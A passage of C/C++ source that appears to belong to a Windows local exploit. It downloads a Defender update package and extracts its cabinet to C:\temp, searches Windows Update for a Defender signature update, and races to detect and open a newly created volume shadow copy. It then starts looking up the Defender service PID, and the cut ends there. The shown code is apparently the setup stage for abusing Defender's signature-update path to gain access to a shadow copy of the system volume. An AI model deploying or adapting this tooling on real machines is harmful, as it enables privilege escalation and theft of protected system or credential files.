		sz = _wtoi(filesz);
		if (!sz)
			UPDATE_FAIL("CDN returned an empty or invalid content length", ERROR_INVALID_DATA);
		li.QuadPart = sz;
		LogV("[UPDATE] Expected download size=%lu bytes\n", sz);

		exebuff = malloc(sz);
		if (!exebuff)
			UPDATE_FAIL("update-package allocation failed", ERROR_NOT_ENOUGH_MEMORY);
		ZeroMemory(exebuff, sz);

		readsz = 0;
		DWORD downloadchunk = 0;
		while (readsz < sz)
		{
			DWORD got = 0;
			DWORD remaining = sz - readsz;
			DWORD requestsize = remaining > 1024 * 1024 ? 1024 * 1024 : remaining;
			if (!InternetReadFile(hint2, (BYTE*)exebuff + readsz, requestsize, &got) || !got)
			{
				DWORD readerror = got ? GetLastError() : ERROR_HANDLE_EOF;
				LogE("[UPDATE] InternetReadFile stopped at %lu/%lu bytes",
					readsz, sz);
				UPDATE_FAIL("InternetReadFile failed or ended early", readerror);
			}
			readsz += got;
			downloadchunk++;
			LogV("[DOWNLOAD] chunk=%lu requested=%lu received=%lu progress=%lu/%lu (%lu%%)\n",
				downloadchunk, requestsize, got, readsz, sz,
				(unsigned long)((readsz * 100ULL) / sz));
		}
		LogV("[UPDATE] Download complete: %lu bytes\n", readsz);

		InternetCloseHandle(hint2);
		hint2 = NULL;
		InternetCloseHandle(hint);
		hint = NULL;
	}
	//printf("Done.\n");
	mappedbuff = GetCabFileFromBuff((PIMAGE_DOS_HEADER)exebuff, sz, &ressz);



	if (!mappedbuff)
	{
		LogE("[UPDATE] Invalid package source=%s", loadedfromcache ? "cache" : "network");
		if (loadedfromcache && !cachefallbackused)
		{
			LogV("[UPDATE] Cached package is invalid; retrying once from the Microsoft CDN\n");
			free(exebuff);
			exebuff = NULL;
			mappedbuff = NULL;
			ressz = 0;
			sz = sizeof(data);
			index = 0;
			ZeroMemory(data, sizeof(data));
			skipcache = true;
			cachefallbackused = true;
			goto acquirepackage;
		}
		UPDATE_FAIL("embedded cabinet was not found in the update PE", ERROR_BAD_FORMAT);
	}
	LogV("[UPDATE] Embedded cabinet located: address=%p, size=%lu bytes\n",
		mappedbuff, ressz);




	cabbuff2 = mappedbuff;
	cabbuffsz = ressz;

	//printf("Extracting cab file content...\n");
	hcabctx = FDICreate((PFNALLOC)CUST_FNALLOC, CUST_FNFREE, (PFNOPEN)CUST_FNOPEN, (PFNREAD)CUST_FNREAD, (PFNWRITE)CUST_FNWRITE, (PFNCLOSE)CUST_FNCLOSE, (PFNSEEK)CUST_FNSEEK, cpuUNKNOWN, &erfstruct);
	if (!hcabctx)
	{
		LogE("[UPDATE] FDICreate failed: operation=0x%X, type=0x%X",
			erfstruct.erfOper, erfstruct.erfType);
		UPDATE_FAIL("FDICreate failed", ERROR_INVALID_DATA);
	}
	LogV("[UPDATE] FDI context created\n");



	extractres = FDICopy(hcabctx, (char*)"\\update.cab", (char*)"C:\\temp", NULL, (PFNFDINOTIFY)CUST_FNFDINOTIFY, NULL, &CabOpArgs);
	if (CabOpArgs)
		cabhead = CabOpArgs->first;
	if (!extractres)
	{
		LogE("[UPDATE] FDICopy failed: operation=0x%X, type=0x%X",
			erfstruct.erfOper, erfstruct.erfType);
		UPDATE_FAIL("FDICopy failed", ERROR_INVALID_DATA);
	}
	LogV("[UPDATE] Cabinet extraction completed\n");
	if (!loadedfromcache && havecachepath)
	{
		if (WriteUpdateCache(cachepath, exebuff, sz))
			LogV("Saved update package cache: %ws\n", cachepath);
		else
			LogV("Could not save update cache (continuing), error: %lu\n", GetLastError());
	}
	FDIDestroy(hcabctx);
	hcabctx = NULL;

	if (!CabOpArgs)
		UPDATE_FAIL("cabinet extraction returned no files", ERROR_FILE_NOT_FOUND);

	if (!cabhead)
		UPDATE_FAIL("cabinet extraction list has no head", ERROR_INVALID_DATA);
	cabcursor = cabhead;

	firstupdt = (UpdateFiles*)malloc(sizeof(UpdateFiles));
	if (!firstupdt)
		UPDATE_FAIL("update-file list-head allocation failed", ERROR_NOT_ENOUGH_MEMORY);
	ZeroMemory(firstupdt, sizeof(UpdateFiles));
	current = firstupdt;
	while (cabcursor)
	{
		if (!cabcursor->filename || strlen(cabcursor->filename) >= MAX_PATH)
			UPDATE_FAIL("cabinet member name is missing or too long", ERROR_BUFFER_OVERFLOW);
		strcpy(current->filename, cabcursor->filename);
		DWORD buffsz = cabcursor->FileSize;
		if (!buffsz || !cabcursor->buff)
			UPDATE_FAIL("cabinet member has no data", ERROR_INVALID_DATA);
		current->filebuff = malloc(buffsz);
		if (!current->filebuff)
			UPDATE_FAIL("cabinet member allocation failed", ERROR_NOT_ENOUGH_MEMORY);
		memmove(current->filebuff, cabcursor->buff, buffsz);
		current->filesz = buffsz;
		extractedcount++;
		LogV("[UPDATE] Extracted file #%lu: %s (%lu bytes)\n",
			extractedcount, current->filename, current->filesz);
		cabcursor = cabcursor->next;
		if (cabcursor)
		{
			current->next = (UpdateFiles*)malloc(sizeof(UpdateFiles));
			if (!current->next)
				UPDATE_FAIL("update-file list-node allocation failed", ERROR_NOT_ENOUGH_MEMORY);
			ZeroMemory(current->next, sizeof(UpdateFiles));
			current = current->next;
		}

	}
	updatesbuilt = true;
	if (filecount)
		*filecount = (int)extractedcount;
	LogV("[UPDATE] GetUpdateFiles completed: %lu files\n", extractedcount);


cleanup:

	if (cabhead)
	{
		CabOpArguments* cabnode = cabhead;
		while (cabnode)
		{
			CabOpArguments* cabnext = cabnode->next;
			free(cabnode->buff);
			free(cabnode->filename);
			free(cabnode);
			cabnode = cabnext;
		}
	}
	if (hint)
		InternetCloseHandle(hint);
	
	if (hint2)
		InternetCloseHandle(hint2);
	if (hcabctx)
		FDIDestroy(hcabctx);
	if (exebuff)
		free(exebuff);
	if (!updatesbuilt)
	{
		while (firstupdt)
		{
			UpdateFiles* next = firstupdt->next;
			free(firstupdt->filebuff);
			free(firstupdt);
			firstupdt = next;
		}
		if (failcode == ERROR_SUCCESS)
		{
			failcode = ERROR_GEN_FAILURE;
			failreason = "update-file list was not completed";
		}
		LogE("[UPDATE] GetUpdateFiles is returning NULL: reason=%s, code=0x%08lX",
			failreason, (unsigned long)failcode);
		SetLastError(failcode);
	}
	else
	{
		SetLastError(ERROR_SUCCESS);
	}

	#undef UPDATE_FAIL
	return firstupdt;


}

bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
{



	IUpdateSearcher* updsrch = 0;
	bool updatesfound = false;
	IUpdateSession* updsess = 0;
	CLSID clsid;
	HRESULT hr = S_OK;
	HRESULT cohr = S_OK;
	ISearchResult* srchres = 0;
	IUpdateCollection* updcollection = 0;
	LONG updnum = 0;
	BSTR title = 0;
	BSTR desc = 0;
	ICategoryCollection* catcoll = 0;
	ICategory* cat = 0;
	BSTR catname = 0;
	IUpdate* upd = 0;
	BSTR searchcriteria = 0;
	bool comini = false;
	if (criterr)
		*criterr = false;
	LogV("[WUA] CheckForWDUpdates entered\n");

	cohr = CoInitialize(NULL);
	comini = SUCCEEDED(cohr);
	if (!comini) {
		LogE("[WUA] CoInitialize failed: 0x%08lX", (unsigned long)cohr);
		if (criterr) *criterr = true;
		return false;
	}
	LogV("[WUA] COM initialized: 0x%08lX\n", (unsigned long)cohr);

	hr = CLSIDFromProgID(OLESTR("Microsoft.Update.Session"), &clsid);
	if (FAILED(hr))
	{
		LogE("[WUA] CLSIDFromProgID failed: 0x%08lX", (unsigned long)hr);
		if (criterr) *criterr = true;
		goto cleanup;
	}
	hr = CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, IID_IUpdateSession, (LPVOID*)&updsess);

	if (FAILED(hr) || !updsess)
	{
		LogE("[WUA] CoCreateInstance(IUpdateSession) failed: 0x%08lX, ptr=%p",
			(unsigned long)hr, updsess);
		if (criterr) *criterr = true;
		goto cleanup;
	}
	LogV("[WUA] Update session created\n");


	hr = updsess->CreateUpdateSearcher(&updsrch);
	if (FAILED(hr))
	{
		LogE("[WUA] CreateUpdateSearcher failed: 0x%08lX", (unsigned long)hr);
		if (criterr) *criterr = true;
		goto cleanup;
	}

	if (!updsrch)
	{
		LogE("[WUA] CreateUpdateSearcher returned NULL");
		if (criterr) *criterr = true;
		goto cleanup;
	}
	LogV("[WUA] Searching available updates; this Windows API call may take time...\n");
	searchcriteria = SysAllocString(L"");
	if (!searchcriteria)
	{
		LogE("[WUA] SysAllocString for search criteria failed");
		if (criterr) *criterr = true;
		goto cleanup;
	}
	hr = updsrch->Search(searchcriteria, &srchres);
	if (FAILED(hr) || !srchres)
	{
		LogE("[WUA] IUpdateSearcher::Search failed: 0x%08lX, ptr=%p",
			(unsigned long)hr, srchres);
		if (criterr) *criterr = true;
		goto cleanup;
	}
	LogV("[WUA] Update search completed\n");

	hr = srchres->get_Updates(&updcollection);
	if (FAILED(hr))
	{
		LogE("[WUA] ISearchResult::get_Updates failed: 0x%08lX", (unsigned long)hr);
		if (criterr) *criterr = true;
		goto cleanup;
	}

	if (!updcollection)
	{
		LogE("[WUA] get_Updates returned NULL");
		if (criterr) *criterr = true;
		goto cleanup;
	}
	////printf("IUpdateCollection->get_Updates : 0x%p\n", updcollection);


	hr = updcollection->get_Count(&updnum);
	if (FAILED(hr))
	{
		LogE("[WUA] IUpdateCollection::get_Count failed: 0x%08lX", (unsigned long)hr);
		if (criterr) *criterr = true;
		goto cleanup;
	}
	LogV("[WUA] Available update count=%ld\n", updnum);

	for (LONG i = 0; i < updnum; i++)
	{
		if (cat) { cat->Release(); cat = 0; }
		if (catcoll) { catcoll->Release(); catcoll = 0; }
		if (catname) { SysFreeString(catname); catname = 0; }
		if (title) { SysFreeString(title); title = 0; }
		if (upd)
		{
			upd->Release();
			upd = 0;
		}
		desc = 0;
		////printf("_________________________________________\n");
		bool IsWdUdpate = false;
		bool IsSigUpdate = false;
		hr = updcollection->get_Item(i, &upd);
		if (FAILED(hr))
		{
			LogE("[WUA] get_Item(%ld) failed: 0x%08lX", i, (unsigned long)hr);
			if (criterr) *criterr = true;
			goto cleanup;
		}
		if (!upd)
		{
			LogE("[WUA] get_Item(%ld) returned NULL", i);
			if (criterr) *criterr = true;
			goto cleanup;
		}
		////printf("Update number : %d\n", i + 1);

		hr = upd->get_Title(&title);
		if (FAILED(hr))
		{
			LogV("[WUA] get_Title(%ld) failed: 0x%08lX; skipping\n",
				i, (unsigned long)hr);
			continue;
		}
		if (!title)
		{
			LogV("[WUA] Update #%ld has no title; skipping\n", i);
			continue;
		}
		title[SysStringLen(title)] = NULL;
		LogV("[WUA] Update #%ld title=%ws\n", i, title);

		/*
		desc = 0;
		upd->get_Description(&desc);
		if (!desc)
		{
			//printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
			continue;
		}
		desc[SysStringLen(desc)] = NULL;
		//printf("Description : %ws\n", desc);
		*/
		catcoll = 0;
		hr = upd->get_Categories(&catcoll);
		if (FAILED(hr) || !catcoll)
		{
			LogV("[WUA] get_Categories(%ld) failed: 0x%08lX, ptr=%p; skipping\n",
				i, (unsigned long)hr, catcoll);
			continue;
		}
		LONG catcount = 0;
		hr = catcoll->get_Count(&catcount);
		if (FAILED(hr))
		{
			LogV("[WUA] Category count failed for update #%ld: 0x%08lX; skipping\n",
				i, (unsigned long)hr);
			continue;
		}
		LogV("[WUA] Update #%ld category count=%ld\n", i, catcount);
		for (LONG j = 0; j < catcount; j++)
		{
			if (cat) { cat->Release(); cat = 0; }
			if (catname) { SysFreeString(catname); catname = 0; }
			cat = 0;
			hr = catcoll->get_Item(j, &cat);
			if (FAILED(hr) || !cat)
			{
				LogV("[WUA] Category get_Item(%ld) failed: 0x%08lX; skipping\n",
					j, (unsigned long)hr);
				continue;
			}
			catname = 0;
			hr = cat->get_Name(&catname);
			if (FAILED(hr) || !catname)
			{
				LogV("[WUA] Category get_Name(%ld) failed: 0x%08lX; skipping\n",
					j, (unsigned long)hr);
				continue;
			}
			catname[SysStringLen(catname)] = NULL;
			LogV("[WUA]   category=%ws\n", catname);
			if (catname)
			{
				if (!IsWdUdpate)
					IsWdUdpate = _wcsicmp(catname, L"Microsoft Defender Antivirus") == 0;
				if (!IsSigUpdate)
					IsSigUpdate = _wcsicmp(catname, L"Definition Updates") == 0;

			}

		}
		updatesfound = IsWdUdpate && IsSigUpdate;

		// Filter out platform/engine updates — the downloaded mpam-fe.exe contains
		// signature definition files (.vdm), so the RPC call ServerMpUpdateEngineSignature
		// will reject them with 0x8050A003 if the pending update is actually a platform
		// update (KB4052623) rather than a signature update (KB2267602).
		// Platform updates contain "antimalware platform" in the title.
		// Signature updates contain "Security Intelligence" in the title.
		if (updatesfound && title)
		{
			bool IsPlatformUpdate = wcsstr(title, L"antimalware platform") != NULL ||
				wcsstr(title, L"Antimalware Platform") != NULL ||
				wcsstr(title, L"antimalware Platform") != NULL;
			bool IsSignatureUpdate = wcsstr(title, L"Security Intelligence") != NULL ||
				wcsstr(title, L"Definition") != NULL;

			if (IsPlatformUpdate)
			{
				LogV("[WUA] Skipping platform update: %ws\n", title);
				updatesfound = false;
			}
			else if (!IsSignatureUpdate)
			{
				LogV("[WUA] Skipping non-signature update: %ws\n", title);
				updatesfound = false;
			}
		}

		if (updatesfound)
		{
			LogV("[WUA] Applicable Defender signature update found\n");
			break;
		}
	}

	if (updatesfound && updatetitle) {
		memmove(updatetitle, title, lstrlenW(title) * sizeof(wchar_t));
	}

cleanup:
	if (searchcriteria)
		SysFreeString(searchcriteria);
	if (catname)
		SysFreeString(catname);
	if (title)
		SysFreeString(title);
	if (cat)
		cat->Release();
	if (catcoll)
		catcoll->Release();
	if (updcollection)
		updcollection->Release();
	if (srchres)
		srchres->Release();
	if (updsrch)
		updsrch->Release();
	if (updsess)
		updsess->Release();
	if (upd)
		upd->Release();
	if (comini)
		CoUninitialize();

	LogV("[WUA] CheckForWDUpdates result: found=%s, critical_error=%s\n",
		updatesfound ? "yes" : "no", (criterr && *criterr) ? "yes" : "no");
	return updatesfound;
}

struct WUAAsyncContext
{
	volatile LONG references;
	bool found;
	bool criticalerror;
	wchar_t title[0x200];
};

static void ReleaseWUAAsyncContext(WUAAsyncContext* context)
{
	if (context && InterlockedDecrement(&context->references) == 0)
		free(context);
}

static DWORD WINAPI WUAAdvisoryWorker(void* argument)
{
	WUAAsyncContext* context = (WUAAsyncContext*)argument;
	if (!context)
		return ERROR_BAD_ARGUMENTS;
	LogV("[WUA-ASYNC] Worker entered\n");
	try
	{
		context->found = CheckForWDUpdates(context->title, &context->criticalerror);
	}
	catch (...)
	{
		context->found = false;
		context->criticalerror = true;
		LogE("[WUA-ASYNC] Worker caught an unexpected C++ exception");
	}
	LogV("[WUA-ASYNC] Worker completed: found=%s, critical_error=%s, title=%ws\n",
		context->found ? "yes" : "no",
		context->criticalerror ? "yes" : "no",
		context->title[0] ? context->title : L"(none)");
	DWORD result = context->criticalerror ? ERROR_GEN_FAILURE : ERROR_SUCCESS;
	ReleaseWUAAsyncContext(context);
	return result;
}

static bool CheckForWDUpdatesWithProgress(wchar_t* updatetitle,
	size_t titlechars, bool* criterr)
{
	if (criterr)
		*criterr = false;
	if (updatetitle && titlechars)
		updatetitle[0] = L'\0';
	WUAAsyncContext* context = (WUAAsyncContext*)malloc(sizeof(WUAAsyncContext));
	if (!context)
	{
		if (criterr) *criterr = true;
		LogE("[WUA-ASYNC] Context allocation failed");
		return false;
	}
	ZeroMemory(context, sizeof(WUAAsyncContext));
	context->references = 2;
	DWORD threadid = 0;
	HANDLE thread = CreateThread(NULL, 0, WUAAdvisoryWorker, context, 0, &threadid);
	if (!thread)
	{
		DWORD threaderror = GetLastError();
		free(context);
		if (criterr) *criterr = true;
		LogE("[WUA-ASYNC] CreateThread failed: %lu", threaderror);
		SetLastError(threaderror);
		return false;
	}
	LogV("[WUA-ASYNC] Worker started: handle=%p, tid=%lu, timeout=%lu ms\n",
		thread, threadid, WUA_ADVISORY_TIMEOUT_MS);
	DWORD waitresult = WaitOneWithHeartbeat(thread, WUA_ADVISORY_TIMEOUT_MS,
		"wua-advisory-search");
	if (waitresult == WAIT_OBJECT_0)
	{
		bool found = context->found;
		bool criticalerror = context->criticalerror;
		if (updatetitle && titlechars)
		{
			wcsncpy(updatetitle, context->title, titlechars - 1);
			updatetitle[titlechars - 1] = L'\0';
		}
		DWORD threadexit = STILL_ACTIVE;
		if (!GetExitCodeThread(thread, &threadexit))
			LogW("[WUA-ASYNC] GetExitCodeThread failed: %lu", GetLastError());
		else
			LogV("[WUA-ASYNC] Thread exit code=%lu\n", threadexit);
		CloseHandle(thread);
		ReleaseWUAAsyncContext(context);
		if (criterr) *criterr = criticalerror;
		return found;
	}

	DWORD waiterror = waitresult == WAIT_FAILED ? GetLastError() : WAIT_TIMEOUT;
	CloseHandle(thread);
	ReleaseWUAAsyncContext(context);
	if (criterr) *criterr = true;
	if (waitresult == WAIT_TIMEOUT)
		LogW("[WUA-ASYNC] Advisory search exceeded %lu ms; detached worker and continuing",
			WUA_ADVISORY_TIMEOUT_MS);
	else
		LogE("[WUA-ASYNC] Advisory wait failed: result=0x%08lX, error=%lu",
			(unsigned long)waitresult, waiterror);
	SetLastError(waiterror);
	return false;
}

//////////////////////////////////////////////////////////////////////
// WD definition update functions end
/////////////////////////////////////////////////////////////////////


//////////////////////////////////////////////////////////////////////
// Volume shadow copy functions
/////////////////////////////////////////////////////////////////////

void rev(char* s) {

	// Initialize l and r pointers
	int l = 0;
	int r = strlen(s) - 1;
	char t;

	// Swap characters till l and r meet
	while (l < r) {

		// Swap characters
		t = s[l];
		s[l] = s[r];
		s[r] = t;

		// Move pointers towards each other
		l++;
		r--;
	}
}

void DestroyVSSNamesList(LLShadowVolumeNames* First)
{
	while (First)
	{
		free(First->name);
		LLShadowVolumeNames* next = First->next;
		free(First);
		First = next;
	}
}

LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, int* vscnumber, DWORD* errorcode)
{


	if (!criticalerr || !vscnumber || !errorcode)
		return NULL;

	*vscnumber = 0;
	ULONG scanctx = 0;
	ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
	ULONG retsz = 0;
	OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
	if (!objdirinfo)
	{
		//printf("Failed to allocate required buffer to query object manager directory.\n");
		*criticalerr = true;
		*errorcode = ERROR_NOT_ENOUGH_MEMORY;
		return NULL;
	}
	ZeroMemory(objdirinfo, reqsz);
	NTSTATUS stat = STATUS_SUCCESS;
	do
	{
		stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, FALSE, &scanctx, &retsz);
		if (stat == STATUS_SUCCESS)
			break;
		else if (stat != STATUS_MORE_ENTRIES)
		{
			//printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
			*criticalerr = true;
			*errorcode = RtlNtStatusToDosError(stat);
			return NULL;
		}

		free(objdirinfo);
		reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
		objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
		if (!objdirinfo)
		{
			//printf("Failed to allocate required buffer to query object manager directory.\n");
			*criticalerr = true;
			*errorcode = ERROR_NOT_ENOUGH_MEMORY;
			return NULL;
		}
		ZeroMemory(objdirinfo, reqsz);
	} while (1);
	void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
	ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
	LLShadowVolumeNames* LLVSScurrent = NULL;
	LLShadowVolumeNames* LLVSSfirst = NULL;
	for (ULONG i = 0; i < ULONG_MAX; i++)
	{
		if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
		{
			free(emptybuff);
			break;
		}
		if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
		{
			wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
			if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
			{
				if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
				{
					(*vscnumber)++;
					if (LLVSScurrent)
					{
						LLVSScurrent->next = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
						if (!LLVSScurrent->next)
						{
							//printf("Failed to allocate memory.\n");
							*criticalerr = true;
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							return NULL;
						}
						ZeroMemory(LLVSScurrent->next, sizeof(LLShadowVolumeNames));
						LLVSScurrent = LLVSScurrent->next;
						LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
						if (!LLVSScurrent->name)
						{
							//printf("Failed to allocate memory !!!\n");
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							*criticalerr = true;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							return NULL;
						}
						ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
						memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);
					}
					else
					{
						LLVSSfirst = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
						if (!LLVSSfirst)
						{
							//printf("Failed to allocate memory.\n");
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							*criticalerr = true;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							return NULL;
						}
						ZeroMemory(LLVSSfirst, sizeof(LLShadowVolumeNames));
						LLVSScurrent = LLVSSfirst;
						LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
						if (!LLVSScurrent->name)
						{
							//printf("Failed to allocate memory !!!\n");
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							*criticalerr = true;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							return NULL;
						}
						ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
						memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);

					}

				}
			}
		}




	}
	free(objdirinfo);
	return LLVSSfirst;
}

DWORD WINAPI ShadowCopyFinderThread(void* fullvsspath)
{

	wchar_t devicepath[] = L"\\Device";
	UNICODE_STRING udevpath = { 0 };
	RtlInitUnicodeString(&udevpath, devicepath);
	OBJECT_ATTRIBUTES objattr = { 0 };
	InitializeObjectAttributes(&objattr, &udevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	NTSTATUS stat = STATUS_SUCCESS;
	HANDLE hobjdir = NULL;
	DWORD retval = ERROR_SUCCESS;
	wchar_t newvsspath[MAX_PATH] = { 0 };
	wcscpy(newvsspath, L"\\Device\\");
	bool criterr = false;
	int vscnum = 0;
	bool restartscan = false;
	ULONG scanctx = 0;
	ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
	ULONG retsz = 0;
	OBJECT_DIRECTORY_INFORMATION* objdirinfo = NULL;
	bool srchfound = false;
	wchar_t vsswinpath[MAX_PATH] = { 0 };
	UNICODE_STRING _vsswinpath = { 0 };

	OBJECT_ATTRIBUTES objattr2 = { 0 };
	IO_STATUS_BLOCK iostat = { 0 };
	HANDLE hlk = NULL;
	LLShadowVolumeNames* vsinitial = NULL;
	void* emptybuff = NULL;
	DWORD waitstart = GetTickCount();
	DWORD lastprogress = waitstart;
	DWORD scanpasses = 0;
	DWORD openattempts = 0;
	const char* exitreason = "completed";

	LogV("[VSS-FINDER] Thread entered; output=%p\n", fullvsspath);
	if (!fullvsspath)
	{
		LogE("[VSS-FINDER] Output buffer is NULL");
		return ERROR_BAD_ARGUMENTS;
	}
	if (!_NtOpenDirectoryObject || !_NtQueryDirectoryObject)
	{
		LogE("[VSS-FINDER] Required ntdll object-manager exports are unavailable");
		return ERROR_PROC_NOT_FOUND;
	}

	stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
	if (stat)
	{
		retval = RtlNtStatusToDosError(stat);
		LogE("[VSS-FINDER] NtOpenDirectoryObject failed: ntstatus=0x%08lX, win32=%lu",
			(unsigned long)stat, retval);
		return retval;
	}
	LogV("[VSS-FINDER] \\Device directory opened: handle=%p\n", hobjdir);
	emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
	if (!emptybuff)
	{
		retval = ERROR_NOT_ENOUGH_MEMORY;
		exitreason = "empty-directory marker allocation failed";
		goto cleanup;
	}
	ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));

	
	vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum,&retval);

	if (criterr)
	{
		exitreason = "initial shadow-copy enumeration failed";
		goto cleanup;
	}
	LogV("[VSS-FINDER] Existing shadow-copy count=%d\n", vscnum);



	stat = STATUS_SUCCESS;

scanagain:
	scanpasses++;
	if (GetTickCount() - waitstart >= LAB_WAIT_TIMEOUT_MS)
	{
		retval = WAIT_TIMEOUT;
		exitreason = "timed out waiting for a new shadow-copy object";
		goto cleanup;
	}
	do
	{
		if (objdirinfo)
			free(objdirinfo);
		objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
		if (!objdirinfo)
		{
			retval = ERROR_NOT_ENOUGH_MEMORY;
			exitreason = "object-directory query allocation failed";
			goto cleanup;
		}
		ZeroMemory(objdirinfo, reqsz);

		scanctx = 0;
		stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, &scanctx, &retsz);
		if (stat == STATUS_SUCCESS)
			break;
		else if (stat != STATUS_MORE_ENTRIES)
		{
			retval = RtlNtStatusToDosError(stat);
			exitreason = "NtQueryDirectoryObject failed";
			goto cleanup;
		}
		reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
	} while (1);
	


	for (ULONG i = 0; i < ULONG_MAX; i++)
	{
		if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
		{
			break;
		}
		if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
		{
			wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
			if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
			{
				if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
				{
					// check against the list if there this is a unique VS Copy
					LLShadowVolumeNames* current = vsinitial;
					bool found = false;
					while (current)
					{
						if (_wcsicmp(current->name, objdirinfo[i].Name.Buffer) == 0)
						{
							found = true;
							break;
						}
						current = current->next;
					}
					if (found)
						continue;
					else
					{
						srchfound = true;
						wcscat(newvsspath, objdirinfo[i].Name.Buffer);
						break;
					}
				}
			}
		}
	}

	if (!srchfound) {
		restartscan = true;
		DWORD now = GetTickCount();
		if (now - lastprogress >= TRACE_HEARTBEAT_MS)
		{
			LogV("[VSS-FINDER] heartbeat: elapsed=%lu ms scan_passes=%lu query_buffer=%lu\n",
				now - waitstart, scanpasses, reqsz);
			lastprogress = now;
		}
		Sleep(50);
		goto scanagain;
	}
	if (objdirinfo) {
		free(objdirinfo);
		objdirinfo = NULL;
	}
	NtClose(hobjdir);
	hobjdir = NULL;



	LogV("[VSS-FINDER] New shadow-copy object=%ws\n", newvsspath);


	wcscpy(vsswinpath, newvsspath);
	wcscat(vsswinpath, L"\\Windows");
	RtlInitUnicodeString(&_vsswinpath, vsswinpath);
	InitializeObjectAttributes(&objattr2, &_vsswinpath, OBJ_CASE_INSENSITIVE, NULL, NULL);

retry:
	openattempts++;
	if (GetTickCount() - waitstart >= LAB_WAIT_TIMEOUT_MS)
	{
		retval = WAIT_TIMEOUT;
		exitreason = "timed out opening the new shadow copy";
		goto cleanup;
	}
	stat = NtCreateFile(&hlk, FILE_READ_ATTRIBUTES, &objattr2, &iostat, NULL, NULL, NULL, FILE_OPEN, NULL, NULL, NULL);
	if (stat == STATUS_NO_SUCH_DEVICE)
	{
		if (openattempts == 1 || openattempts % 20 == 0)
			LogV("[VSS-FINDER] Snapshot not ready: attempt=%lu ntstatus=0x%08lX\n",
				openattempts, (unsigned long)stat);
		Sleep(50);
		goto retry;
	}
	if (stat)
	{
		retval = RtlNtStatusToDosError(stat);
		exitreason = "NtCreateFile(new shadow copy) failed";
		goto cleanup;


	}
	//printf("Successfully accessed volume shadow copy.\n");
	CloseHandle(hlk);
	if (fullvsspath)
		wcscpy((wchar_t*)fullvsspath, newvsspath);
	LogV("[VSS-FINDER] Snapshot is accessible; copied path=%ws\n", newvsspath);


cleanup:
	if (hobjdir)
		NtClose(hobjdir);
	if (emptybuff)
		free(emptybuff);
	if (vsinitial)
		DestroyVSSNamesList(vsinitial);
	if (retval == ERROR_SUCCESS)
		LogV("[VSS-FINDER] Thread completed successfully\n");
	else
		LogE("[VSS-FINDER] Thread exiting: reason=%s, code=0x%08lX",
			exitreason, (unsigned long)retval);

	return retval;
}

DWORD GetWDPID()
{
	static DWORD retval = 0;
	if (retval)
		return retval;

	SC_HANDLE scmgr = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (!scmgr) {
		LogE("[DEFENDER-PID] OpenSCManager failed: %lu", GetLastError());
		return 0;
	}
	SC_HANDLE hsvc = OpenService(scmgr, L"WinDefend", SERVICE_QUERY_STATUS);
	DWORD serviceerror = hsvc ? ERROR_SUCCESS : GetLastError();
	CloseServiceHandle(scmgr);
	if (!hsvc) {
		LogE("[DEFENDER-PID] OpenService(WinDefend) failed: %lu", serviceerror);
		return 0;
	}


	SERVICE_STATUS_PROCESS ssp = { 0 };
